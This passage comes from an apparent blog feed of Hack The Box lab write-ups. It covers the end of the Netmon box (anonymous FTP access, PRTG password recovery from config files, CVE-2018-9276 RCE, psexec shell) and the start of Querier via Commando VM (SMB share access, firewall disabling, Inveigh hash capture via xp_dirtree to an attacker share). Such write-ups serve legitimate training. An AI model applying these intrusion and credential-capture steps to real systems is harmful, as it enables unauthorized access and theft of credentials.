02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
226 Transfer complete.
ftp&amp;gt; cd Users
250 CWD command successful.
ftp&amp;gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       &amp;lt;DIR&amp;gt;          Administrator
06-28-19  06:43AM       &amp;lt;DIR&amp;gt;          Public
226 Transfer complete.
ftp&amp;gt; cd Public
250 CWD command successful.
ftp&amp;gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Documents
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Downloads
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Music
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Pictures
06-28-19  06:49AM                   82 tester.txt
02-03-19  12:35AM                   33 user.txt
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Videos
226 Transfer complete.
ftp&amp;gt; get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.07 secs (0.4790 kB/s)
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;prtg-credentials&quot;&gt;PRTG Credentials&lt;/h4&gt;
&lt;h4 id=&quot;i-checked-the-http-service-and-found-a-web-application-called-prtg-network-monitor-however-we-need-credentials-to-access-the-application&quot;&gt;I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service and found a web application called PRTG Network Monitor. However we need credentials to access the application.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-access-to-c-through-the-ftp-server-so-we-can-search-for-credentials-there-i-searched-for-the-place-where-prtg-configuration-files-are-saved-and-found-it-was-in-cusersall-usersapplication-datapaesslerprtg-network-monitor-so-i-went-there-and-downloaded-the-configuration-files-&quot;&gt;We have access to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:&lt;/code&gt; through the &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor&lt;/code&gt; so I went there and downloaded the configuration files :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb
Connected to netmon.htb.
220 Microsoft FTP Service
Name (netmon.htb:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password. 
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&amp;gt; cd Users
250 CWD command successful.
ftp&amp;gt; ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       &amp;lt;DIR&amp;gt;          Administrator
07-16-16  09:28AM       &amp;lt;DIR&amp;gt;          All Users
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Default
07-16-16  09:28AM       &amp;lt;DIR&amp;gt;          Default User
07-16-16  09:16AM                  174 desktop.ini
06-28-19  06:43AM       &amp;lt;DIR&amp;gt;          Public
226 Transfer complete.
ftp&amp;gt; cd &quot;All Users&quot;
250 CWD command successful.
ftp&amp;gt; ls -al
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Application Data
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Desktop
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Documents
02-03-19  12:15AM       &amp;lt;DIR&amp;gt;          Licenses
11-20-16  10:36PM       &amp;lt;DIR&amp;gt;          Microsoft
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          Paessler
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          regid.1991-06.com.microsoft
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          SoftwareDistribution
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Start Menu
02-03-19  12:15AM       &amp;lt;DIR&amp;gt;          TEMP
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Templates
11-20-16  10:19PM       &amp;lt;DIR&amp;gt;          USOPrivate
11-20-16  10:19PM       &amp;lt;DIR&amp;gt;          USOShared
02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          VMware
226 Transfer complete.
ftp&amp;gt; cd &quot;Application Data/Paessler/PRTG Network Monitor&quot;
250 CWD command successful.
ftp&amp;gt; ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:40AM       &amp;lt;DIR&amp;gt;          Configuration Auto-Backups
06-28-19  06:24AM       &amp;lt;DIR&amp;gt;          Log Database
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          Logs (Debug)
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          Logs (Sensors)
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          Logs (System)
06-28-19  06:24AM       &amp;lt;DIR&amp;gt;          Logs (Web Server)
02-25-19  08:01PM       &amp;lt;DIR&amp;gt;          Monitoring Database
06-28-19  06:54AM              1287578 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
06-28-19  06:25AM              1647701 PRTG Graph Data Cache.dat
02-25-19  11:00PM       &amp;lt;DIR&amp;gt;          Report PDFs
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          System Information Database
02-03-19  12:40AM       &amp;lt;DIR&amp;gt;          Ticket Database
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          ToDo Database
226 Transfer complete.
ftp&amp;gt; get &quot;PRTG Configuration.dat&quot;
local: PRTG Configuration.dat remote: PRTG Configuration.dat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1287578 bytes received in 3.43 secs (366.5319 kB/s)
ftp&amp;gt; get &quot;PRTG Configuration.old&quot;
local: PRTG Configuration.old remote: PRTG Configuration.old
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 3.05 secs (380.7779 kB/s)
ftp&amp;gt; get &quot;PRTG Configuration.old.bak&quot;
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 3.04 secs (370.2494 kB/s)
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;knowing-that-the-default-admin-user-for-prtg-is-prtgadmin-i-searched-for-that-string-in-the-3-configuration-files-&quot;&gt;Knowing that the default admin user for PRTG is &lt;code class=&quot;highlighter-rouge&quot;&gt;prtgadmin&lt;/code&gt; I searched for that string in the 3 configuration files :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat * | grep -A 20 -B 20 &quot;prtgadmin&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/netmon/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-got-the-password-which-was-prtgdmin2018-&quot;&gt;I got the password which was &lt;code class=&quot;highlighter-rouge&quot;&gt;PrTg@dmin2018&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-it-didnt-work-after-some-attempts-i-changed-it-to-prtgdmin2019-and-it-worked-&quot;&gt;However it didn’t work, after some attempts I changed it to &lt;code class=&quot;highlighter-rouge&quot;&gt;PrTg@dmin2019&lt;/code&gt; and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/netmon/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce-root-flag&quot;&gt;RCE, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-searching-for-authenticated-exploits-i-found-cve-2018-9276-which-was-an-authenticated-rce-vulnerability-i-used-this-exploit-which-exploits-the-rce-and-creates-a-new-administrator-user-this-works-because-prtg-runs-as-system-&quot;&gt;After searching for authenticated exploits I found &lt;a href=&quot;https://github.com/wildkindcc/CVE-2018-9276&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2018-9276&lt;/code&gt;&lt;/a&gt; which was an authenticated &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; vulnerability. I used &lt;a href=&quot;https://github.com/M4LV0/PRTG-Network-Monitor-RCE&quot;&gt;this exploit&lt;/a&gt; which exploits the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; and creates a new Administrator user (This works because PRTG runs as &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;new-user-credentials--pentestp3nt3st-i-used-psexecpy-from-impacket-to-get-a-shell-&quot;&gt;New user credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;pentest:P3nT3st!&lt;/code&gt;. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt; from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt;&lt;/a&gt; to get a shell :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py pentest:'P3nT3st!'@netmon.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/netmon/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---querier&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---hackback&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/hackback/&quot;&gt;Hack The Box - Hackback&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="ftp" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as netmon.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC netmon.htb We got ftp on port 21, http on port 80 and smb. The most interesting thing is that anonymous login is allowed on ftp and obviously it’s running on C: ! FTP, User Flag I checked that ftp server and got the user flag for Public : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM &amp;lt;DIR&amp;gt; inetpub 07-16-16 09:18AM &amp;lt;DIR&amp;gt; PerfLogs 02-25-19 10:56PM &amp;lt;DIR&amp;gt; Program Files 02-03-19 12:28AM &amp;lt;DIR&amp;gt; Program Files (x86) 02-03-19 08:08AM &amp;lt;DIR&amp;gt; Users 02-25-19 11:49PM &amp;lt;DIR&amp;gt; Windows 226 Transfer complete. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd Public 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Downloads 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Music 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Pictures 06-28-19 06:49AM 82 tester.txt 02-03-19 12:35AM 33 user.txt 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Videos 226 Transfer complete. ftp&amp;gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0.07 secs (0.4790 kB/s) ftp&amp;gt; We owned user. PRTG Credentials I checked the http service and found a web application called PRTG Network Monitor. However we need credentials to access the application. We have access to C: through the ftp server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor so I went there and downloaded the configuration files : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 07-16-16 09:28AM &amp;lt;DIR&amp;gt; All Users 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Default 07-16-16 09:28AM &amp;lt;DIR&amp;gt; Default User 07-16-16 09:16AM 174 desktop.ini 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd &quot;All Users&quot; 250 CWD command successful. ftp&amp;gt; ls -al 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Application Data 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Desktop 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 02-03-19 12:15AM &amp;lt;DIR&amp;gt; Licenses 11-20-16 10:36PM &amp;lt;DIR&amp;gt; Microsoft 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Paessler 02-03-19 08:05AM &amp;lt;DIR&amp;gt; regid.1991-06.com.microsoft 07-16-16 09:18AM &amp;lt;DIR&amp;gt; SoftwareDistribution 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Start Menu 02-03-19 12:15AM &amp;lt;DIR&amp;gt; TEMP 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Templates 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOPrivate 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOShared 02-25-19 10:56PM &amp;lt;DIR&amp;gt; VMware 226 Transfer complete. ftp&amp;gt; cd &quot;Application Data/Paessler/PRTG Network Monitor&quot; 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Configuration Auto-Backups 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Log Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Debug) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Sensors) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (System) 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Logs (Web Server) 02-25-19 08:01PM &amp;lt;DIR&amp;gt; Monitoring Database 06-28-19 06:54AM 1287578 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 06-28-19 06:25AM 1647701 PRTG Graph Data Cache.dat 02-25-19 11:00PM &amp;lt;DIR&amp;gt; Report PDFs 02-03-19 12:18AM &amp;lt;DIR&amp;gt; System Information Database 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Ticket Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; ToDo Database 226 Transfer complete. ftp&amp;gt; get &quot;PRTG Configuration.dat&quot; local: PRTG Configuration.dat remote: PRTG Configuration.dat 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1287578 bytes received in 3.43 secs (366.5319 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old&quot; local: PRTG Configuration.old remote: PRTG Configuration.old 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1189697 bytes received in 3.05 secs (380.7779 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old.bak&quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1153755 bytes received in 3.04 secs (370.2494 kB/s) ftp&amp;gt; Knowing that the default admin user for PRTG is prtgadmin I searched for that string in the 3 configuration files : cat * | grep -A 20 -B 20 &quot;prtgadmin&quot; I got the password which was PrTg@dmin2018 : However it didn’t work, after some attempts I changed it to PrTg@dmin2019 and it worked : RCE, Root Flag After searching for authenticated exploits I found CVE-2018-9276 which was an authenticated RCE vulnerability. I used this exploit which exploits the RCE and creates a new Administrator user (This works because PRTG runs as system) : New user credentials : pentest:P3nT3st!. I used psexec.py from impacket to get a shell : psexec.py pentest:'P3nT3st!'@netmon.htb And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Querier Next Hack The Box write-up : Hack The Box - Hackback</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/netmon/0.png" /></entry><entry><title type="html">Hack The Box - Querier (Commando)</title><link href="http://localhost:4000/hack-the-box/querier-2/" rel="alternate" type="text/html" title="Hack The Box - Querier (Commando)" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier-2</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier-2/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-this-is-the-second-post-for-querier-you-can-read-the-first-post-here-in-the-first-post-i-solved-it-with-kali-in-this-post-i-will-solve-it-with-commando-vm-queriers-ip-is-101010125-i-added-it-to-cwindowssystem32driversetchosts-as-querierhtb-lets-jump-right-in-&quot;&gt;Hey guys this is the second post for Querier, you can read the first post &lt;a href=&quot;/hack-the-box/querier&quot;&gt;here&lt;/a&gt;. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-we-dont-have-credentials-for-mssql-so-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. We don’t have credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; so let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-list-the-shares-we-can-do-that-using-net-view-&quot;&gt;We need to list the shares, We can do that using &lt;code class=&quot;highlighter-rouge&quot;&gt;net view&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net view querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-only-showed-us-reports-because-its-the-only-share-that-we-can-access-anonymously-which-is-nice&quot;&gt;It only showed us &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt; because it’s the only share that we can access anonymously which is nice.&lt;/h4&gt;
&lt;h4 id=&quot;we-can-mount-the-share-from-cmd-with-net-use-&quot;&gt;We can mount the share from &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;net use&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net use Z: \\querier.htb\Reports /persistent:yes&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-also-do-it-from-the-file-explorer-&quot;&gt;We can also do it from the file explorer :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
&lt;h4 id=&quot;i-used-olevba-to-get-credentials-from-the-excel-file-like-i-did-in-the-first-post-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; to get credentials from the excel file like I did in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-connect-to-the-mssql-server-i-will-use-heidisql-&quot;&gt;To connect to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server I will use &lt;a href=&quot;https://www.heidisql.com/&quot;&gt;HeidiSQL&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-authentication-failed-&quot;&gt;However, authentication failed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-windows-authentication-&quot;&gt;I tried windows authentication :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-it-also-failed-because-it-was-trying-as-guest-not-reporting-&quot;&gt;But it also failed because it was trying as guest not reporting :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-solve-this-we-can-use-runas-to-run-heidi-as-reporting-&quot;&gt;To solve this we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; as reporting :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\reporting cmd.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-the-new-cmd-session-i-ran-heidi-&quot;&gt;From the new &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; session I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-windows-authentication-worked-&quot;&gt;Now windows authentication worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;got-permission-denied-for-xp_cmdshell-&quot;&gt;Got permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-run-a-fake-smb-server-to-capture-credentials-using-a-tool-called-inveigh-which-works-like-responder-from-powershell-i-imported-inveigh-import-module-ctoolsinveighinveighps1-then-i-disabled-the-firewall-netsh-advfirewall-set-allprofiles-state-off-and-invoked-inveigh-invoke-inveigh--ip-1010xxxx--consoleoutput-y&quot;&gt;We can run a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; server to capture credentials using a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; which works like responder. From &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt; I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Import-Module C:\Tools\Inveigh\Inveigh.ps1&lt;/code&gt;). Then I disabled the firewall (&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh advfirewall set allprofiles state off&lt;/code&gt;) and invoked &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y&lt;/code&gt;).&lt;/h4&gt;
&lt;h4 id=&quot;from-heidi-i-used-xp_dirtree-&quot;&gt;From &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; I used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;inveigh-captured-the-ntlmv2-hash-for-mssql-svc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; captured the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
